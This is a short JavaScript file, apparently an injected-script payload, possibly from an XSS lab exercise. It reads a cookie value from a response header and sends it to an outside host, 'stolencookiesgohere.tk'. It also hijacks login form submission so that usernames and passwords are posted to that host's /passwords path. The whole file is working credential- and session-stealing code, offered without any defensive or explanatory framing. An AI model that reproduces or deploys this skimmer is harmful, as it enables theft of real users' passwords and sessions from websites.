var req = new XMLHttpRequest(); 
req.open('GET', document.location, false); 
req.send(null); 
var cookie = req.getResponseHeader('X-Stolen-Cookie').toLowerCase();
xhttp = new XMLHttpRequest();
xhttp.open("POST", "http://stolencookiesgohere.tk", true);
xhttp.send(cookie);
//alert(cookie); 

var postPassword = function(){
    var postme = document.getElementById('login-form');
    var datastring = postme.elements[0].value + ":" + postme.elements[1].value + ":" + postme.elements[2].value;
    xhttp = new XMLHttpRequest();
    xhttp.open("POST", "http://stolencookiesgohere.tk/passwords", true);
    xhttp.send(datastring);
}

var postPassword2 = function(){
    var username = document.getElementById('username');
    var password=  document.getElementById('password');
    var datastring = username.value + ":" + password.value;
    xhttp = new XMLHttpRequest();
    xhttp.open("POST", "http://stolencookiesgohere.tk/passwords", true);
    xhttp.send(datastring);
}

var form = document.getElementById('login-form');
form.onsubmit = function(){ return postPassword() };
var ufield = document.getElementById('username');
if(ufield !== null){
var form2 = ufield.parentElement.parentElement.parentElement.parentElement;
form2.onsubmit = function(){ return postPassword2() };
}

